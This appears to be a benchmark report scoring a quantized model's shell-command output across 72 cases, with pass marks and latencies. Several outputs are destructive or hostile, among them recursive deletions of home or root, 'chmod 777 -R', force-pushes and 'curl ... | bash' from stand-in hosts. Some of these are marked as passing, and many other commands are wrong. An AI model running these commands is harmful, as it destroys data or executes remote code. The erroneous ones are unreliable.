# eval: llama-server / linux-commands-0407-00.Q4_K_M.gguf (linuxcmds-0407)
- mode: plain · dataset core.jsonl#83828218eadbc7f7 · repeat 1
- pass: 20/72 (28%)
- cold p50 300ms p95 656ms · warm p50 0ms p95 0ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✗ | 375 | - | echo "needs manual review" |
| u02 | ✗ | 465 | - | find . -size +10k -exec ls -sh {} \; |
| u03 | ✗ | 299 | - | echo "needs manual review" |
| u04 | ✗ | 292 | - | echo "needs manual review" |
| u05 | ✗ | 637 | - | find . -type f -exec stat -f "%s %B" {} \; | awk '{print $1}' |
| u06 | ✓ | 392 | - | find . -name "*.log" -mtime -1 |
| u07 | ✗ | 472 | - | jobs -p | grep -v grep | awk '{print $2}' |
| u08 | ✗ | 297 | - | echo "needs manual review" |
| u09 | ✗ | 291 | - | echo "needs manual review" |
| u10 | ✓ | 329 | - | mkdir projects && cd projects |
| u11 | ✗ | 291 | - | echo "needs manual review" |
| u12 | ✗ | 291 | - | echo "needs manual review" |
| u13 | ✗ | 596 | - | kill -9 $(netstat -s | grep :8080 | awk '{print $5}') |
| u14 | ✓ | 411 | - | tail -n 20 /var/log/syslog |
| u15 | ✗ | 303 | - | yum -q grep python3 |
| u16 | ✓ | 329 | - | brew update && brew list --uninstalled |
| u17 | ✗ | 292 | - | echo "needs manual review" |
| u18 | ✗ | 253 | - | git reset HEAD^ |
| u19 | ✗ | 595 | - | find . -type f -exec du -Sh {} + | sort -n -r | head -5 |
| u20 | ✗ | 871 | - | ps -o pid,pcpu,user,cmd | grep -v grep | awk '{if(NR==1){print}}' | xargs kill - |
| u21 | ✗ | 550 | - | find . -name '*.js' -print0 | xargs -0 wc -l |
| u22 | ✗ | 299 | - | echo "needs manual review" |
| u23 | ✗ | 291 | - | echo "needs manual review" |
| u24 | ✓ | 425 | - | find . -type f -exec grep -H TODO {} \; |
| u25 | ✗ | 299 | - | echo "needs manual review" |
| u26 | ✗ | 292 | - | echo "needs manual review" |
| u27 | ✗ | 293 | - | echo "needs manual review" |
| u28 | ✓ | 558 | - | find . -name '*/node_modules' -type d -exec rm -rf {} \; |
| u29 | ✓ | 1694 | - | netstat -tulpn | grep LISTEN | grep TCP | grep -v LISTEN | grep -v '::' | grep - |
| u30 | ✓ | 263 | - | unzip file.zip |
| u31 | ✗ | 482 | - | watch -n 1 `tail -f /var/log/syslog` |
| u32 | ✓ | 203 | - | uptime |
| u33 | ✗ | 367 | - | find /etc/ -name '*.sh' |
| u34 | ✗ | 293 | - | echo "needs manual review" |
| u35 | ✓ | 310 | - | cp file.txt backup.txt |
| u36 | ✗ | 425 | - | rename 's/\./' old.txt > new.txt |
| u37 | ✗ | 680 | - | find . -name "downloads" -type d -exec stat -f "%s %p" {} \; | tail -1 |
| u38 | ✗ | 294 | - | yum list installed npm global packages |
| u39 | ✗ | 291 | - | echo "needs manual review" |
| u40 | ✗ | 290 | - | echo "needs manual review" |
| a01 | ✗ | 254 | - | find ~ -delete |
| a02 | ✗ | 290 | - | echo "needs manual review" |
| a03 | ✓ | 272 | - | git push -f main |
| a04 | ✗ | 504 | - | curl -s https://sketchy.example.com/install.sh | bash |
| a05 | ✗ | 299 | - | echo "needs manual review" |
| a06 | ✗ | 328 | - | chmod 777 -R everything |
| a07 | ✗ | 293 | - | echo "needs manual review" |
| a08 | ✗ | 293 | - | echo "needs manual review" |
| a09 | ✓ | 310 | - | sudo chmod 700 / |
| a10 | ✓ | 521 | - | find /var/log -type f -mtime +30 -exec rm {} \; |
| a11 | ✗ | 296 | - | echo "needs manual review" |
| a12 | ✗ | 292 | - | echo "needs manual review" |
| a13 | ✓ | 310 | - | yum remove -y nodejs npm |
| a14 | ✗ | 291 | - | echo "needs manual review" |
| a15 | ✓ | 404 | - | find . -name "*.tmp" -exec rm {} \; |
| a16 | ✓ | 394 | - | find / -type f -exec sudo rm {} \; |
| a17 | ✗ | 292 | - | echo "needs manual review" |
| a18 | ✗ | 291 | - | echo "needs manual review" |
| a19 | ✗ | 291 | - | echo "needs manual review" |
| a20 | ✗ | 292 | - | echo "needs manual review" |
| u41 | ✓ | 349 | - | find ~/ -size +100k |
| u42 | ✗ | 292 | - | echo "needs manual review" |
| u43 | ✗ | 656 | - | git log --pretty=oneline --abbrev-commit --date=relative --graph --oneline --rev |
| u44 | ✗ | 297 | - | echo "needs manual review" |
| u45 | ✓ | 348 | - | find . -type f | wc -l |
| u46 | ✗ | 292 | - | echo "needs manual review" |
| u47 | ✓ | 466 | - | df -h | grep -v ^/ | grep -v ^$ |
| u48 | ✗ | 411 | - | who | grep -v `who | grep -v ` |
| a21 | ✗ | 300 | - | echo "needs manual review" |
| a22 | ✗ | 292 | - | echo "needs manual review" |
| a23 | ✓ | 309 | - | find . -exec rm {} \; |
| a24 | ✗ | 407 | - | curl https://x.io/i.sh | bash |
